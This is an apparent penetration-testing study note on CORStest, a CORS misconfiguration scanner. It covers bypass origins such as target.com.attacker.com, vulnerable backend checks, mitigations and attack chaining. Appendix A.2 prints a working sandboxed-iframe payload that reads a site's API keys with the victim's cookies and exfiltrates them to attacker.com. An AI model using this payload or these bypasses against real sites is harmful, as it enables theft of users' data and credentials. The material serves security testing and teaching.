---
tags: [tools, web-testing, exploiter, vapt]
difficulty: advanced
module: "59 - Complete Tools Reference"
topic: "59.38 CORStest CORS Misconfiguration Tester"
---

# CORStest CORS Misconfiguration Tester

## 1. Introduction

While `corsy` is an excellent tool for general CORS enumeration and misconfiguration scanning, **CORStest** is another specialized utility designed to pinpoint vulnerabilities in Cross-Origin Resource Sharing implementations. Developed to assist security researchers in quickly evaluating API endpoints, CORStest excels at high-speed concurrent scanning across massive datasets and identifying subtle bypasses in origin-validation regex logic.

CORStest focuses heavily on analyzing how the server interprets variations of the trusted domain name. Misconfigured backend validation often relies on flawed string matching mechanisms (like `startsWith`, `endsWith`, or loose regular expressions). CORStest automates the generation of edge-case origins to expose these flaws, ensuring that an attacker cannot spoof a trusted origin.

## 2. Under the Hood: The Evaluation Engine

The core logic of CORStest revolves around sending HTTP `OPTIONS` and `GET` requests equipped with a dynamically generated `Origin` header. It evaluates the server's response to see if the origin is reflected in the `Access-Control-Allow-Origin` (ACAO) header alongside the critical `Access-Control-Allow-Credentials: true` (ACAC) header.

### 2.1 Bypass Generation Strategies

CORStest employs several sophisticated permutation strategies to test backend logic:
- **Prefix Expansion:** If `target.com` is trusted, does the server trust `evil-target.com`? (Flawed `endsWith` check).
- **Suffix Expansion:** If `target.com` is trusted, does the server trust `target.com.evil.com`? (Flawed `startsWith` check).
- **Delimiter Injection:** Injecting special characters like `%60`, `%0d`, `%0a`, `_`, `-`, or unescaped dots. For example, `target.com` might be matched against `targetXcom.evil.com` if the regular expression uses `.` without escaping it (`target.com` matches `targetXcom`).
- **Protocol Confusion:** Sending `http://target.com` when the application strictly expects `https://target.com`. If the server accepts the unencrypted origin, it might be vulnerable to active Man-in-the-Middle (MitM) attacks.

## 3. Architecture and Attack Flow Diagram

```ascii
                         [Target List: urls.txt]
                                   |
                                   v
                      +-------------------------+
                      |   CORStest Engine       |
                      |   (Concurrent Workers)  |
                      +-------------------------+
                                   |
         +-------------------------+-------------------------+
         |                         |                         |
  [Regex Bypass]             [Prefix Bypass]           [Protocol Bypass]
Origin: targetXcom       Origin: eviltarget.com      Origin: http://target
         |                         |                         |
         +-------------------------+-------------------------+
                                   |
                            [Network Interface]
                                   |
===========================================================================
                                INTERNET
===========================================================================
                                   |
                         [Target Web Server / API]
                       (Origin Validation Middleware)
                                   |
                   <Validates against whitelist roughly>
                                   |
                          [HTTP Response Generator]
                                   |
===========================================================================
                      [CORStest Response Analyzer]
                                   |
                   [Check ACAO Header == Injected Origin?]
                                   |
                  +----------------+----------------+
                  |                                 |
              [Match Found]                    [No Match]
         Check ACAC Header == true             Discard Result
                  |
         [Log Vulnerability]
```

## 4. Usage and Syntax

CORStest is built for simplicity and speed. It can ingest a list of domains and test them concurrently.

### 4.1 Basic Execution

**Scanning a single domain:**
While mostly used for lists, you can test single entities. Usually, the tool expects a file containing the targets.
```bash
python corstest.py targets.txt
```

### 4.2 Advanced Flags and Customization

- **Quiet Mode (`-q`):** Suppresses standard output and only prints vulnerable targets, making it ideal for bash piping or automation workflows.
  ```bash
  python corstest.py targets.txt -q > vulnerable_cors.txt
  ```
- **Custom Payloads:** If you suspect a specific regex pattern is being used, you can heavily modify the payload generation to target that exact flaw.
- **Concurrency (`-p` / `-c`):** Adjust the number of parallel workers depending on your bandwidth and the target's rate-limiting mechanisms.
  ```bash
  python corstest.py targets.txt -p 50
  ```

## 5. Vulnerability Case Studies

### 5.1 The Unescaped Dot Vulnerability

A common error in Node.js or Python backend CORS configuration involves using standard regular expressions without escaping the dot character.

*Backend Logic:*
```javascript
const allowedOrigins = /https:\/\/api.target.com/;
if (allowedOrigins.test(req.headers.origin)) {
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
}
```

*CORStest Action:*
CORStest generates the payload `Origin: https://apiXtarget.com`. The regex `.` matches any character, so `X` satisfies the condition. The server responds with `Access-Control-Allow-Origin: https://apiXtarget.com`.

*Exploitation:*
An attacker registers `apiXtarget.com`, hosts a malicious HTML page, and lures authenticated users to it. The page executes AJAX requests to `target.com`, successfully stealing data because the server trusts the spoofed origin.

### 5.2 The 'StartsWith' Misconfiguration

*Backend Logic:*
```java
if (origin != null && origin.startsWith("https://target.com")) {
    response.addHeader("Access-Control-Allow-Origin", origin);
    response.addHeader("Access-Control-Allow-Credentials", "true");
}
```

*CORStest Action:*
CORStest sends `Origin: https://target.com.attacker.com`. Since the string technically starts with `https://target.com`, the validation passes.

*Exploitation:*
The attacker simply creates a subdomain on their own infrastructure (`target.com.attacker.com`) and hosts the exploit there.

## 6. Preflight Requests Analysis

CORStest also evaluates how the backend handles `OPTIONS` requests (Preflight). When a cross-origin request is considered "complex" (e.g., uses custom headers like `Authorization` or uses methods like `PUT`/`DELETE`), the browser first sends an `OPTIONS` request.
If the server allows the origin in the Preflight response, the browser proceeds with the actual request. CORStest checks both the preflight and the GET request logic, ensuring complete coverage.

## 7. Mitigation and Best Practices

To secure applications against the flaws discovered by CORStest:
- **Avoid Regular Expressions if Possible:** Use exact string matching for domains.
- **Proper Regex Anchoring:** If regex is absolutely necessary, anchor it correctly. Ensure you use `^` for the beginning and `$` for the end of the string.
  *Incorrect:* `/https:\/\/target\.com/`
  *Correct:* `/^https:\/\/target\.com$/`
- **Escape Special Characters:** Always escape dots (`\.`) in regular expressions.
- **Implement a Strict Whitelist:** Rely on an array of fully qualified domain names (FQDNs) and use standard array `includes()` or `contains()` methods.

## 8. Chaining Opportunities

- **WebSockets Hijacking:** If the application uses WebSockets and relies on the Origin header for authentication/authorization (Cross-Site WebSocket Hijacking - CSWSH), a CORS bypass effectively leads to full WebSocket session compromise. See [[26 - WebSockets Security and Exploitation]].
- **Sensitive Data Exposure:** Chain with endpoints returning PII, API keys, or JWT tokens to escalate the impact from informational to critical account takeover. See [[06 - Sensitive Data Exposure via APIs]].
- **SSRF Amplification:** In rare cases, if CORS allows cross-origin reading and there is an SSRF vulnerability, the attacker can use the victim's browser to execute the SSRF and read the results, bypassing internal network protections. See [[15 - Server-Side Request Forgery (SSRF)]].

## 9. Appendix: Extensive Vulnerability Patterns and Payloads

### A.1 In-Depth Look at Flawed Regex
Developers often use regex to validate origins but fail to understand the nuances of the language.
- **Missing End Anchors:**
  Regex: `^https:\/\/target\.com`
  Payload: `https://target.com.attacker.com`
  Result: Match. The regex checks the start but ignores the end.
- **Unescaped Dots:**
  Regex: `^https:\/\/www\.target\.com$`
  Wait, the first dot is escaped, but if a developer writes `^https://www.target.com$`, the dots are unescaped.
  Payload: `https://wwwAtargetUcom`
  Result: Match. `.` matches any single character.

### A.2 The `null` Origin Exploitation Details
The `null` origin is typically generated when:
1. A request is made from a `file:///` URI.
2. A request is made from a sandboxed `<iframe>` without the `allow-same-origin` attribute.
3. A cross-origin redirect occurs.

If CORStest detects `Origin: null` is allowed, an attacker can host an HTML file containing:
```html
<iframe sandbox="allow-scripts allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = req.onerror = function() {
  fetch('http://attacker.com/?data=' + btoa(req.responseText));
};
req.open('GET', 'https://target.com/api/keys', true);
req.withCredentials = true;
req.send();
</script>"></iframe>
```
The browser will issue the request with `Origin: null` and `Cookie: session=...`. The server responds with `Access-Control-Allow-Origin: null` and `Access-Control-Allow-Credentials: true`. The sandboxed script reads the API keys and exfiltrates them.

### A.3 Exploiting Internal Networks (CORS + Intranet)
CORStest can be used to scan internal network endpoints via an SSRF or pivoting. Sometimes internal APIs blindly trust *any* origin because they rely on the firewall for protection. If an attacker can force an internal employee's browser to execute JavaScript (via XSS or a malicious external site), they can pivot through the employee's browser to access the internal API if the internal API's CORS policy is overly permissive (e.g., echoing the Origin).

### A.4 Troubleshooting CORStest Runs
- **False Negatives:** Ensure you are passing necessary authentication cookies if the endpoint requires them, otherwise the server might return a 401 or 403 before evaluating the CORS headers.
- **Thread Exhaustion:** If testing thousands of endpoints, lower the thread count (`-c`) to prevent socket exhaustion on your local machine.

## 10. Related Notes

- [[07 - Cross-Origin Resource Sharing Architecture]]
- [[37 - corsy CORS Scanner]]
- [[40 - Understanding Browser Security Policies]]
- [[20 - Cross-Site Request Forgery (CSRF)]]
- [[51 - Custom Regex Vulnerabilities]]
- [[13 - Advanced Man-in-the-Middle Attacks]]
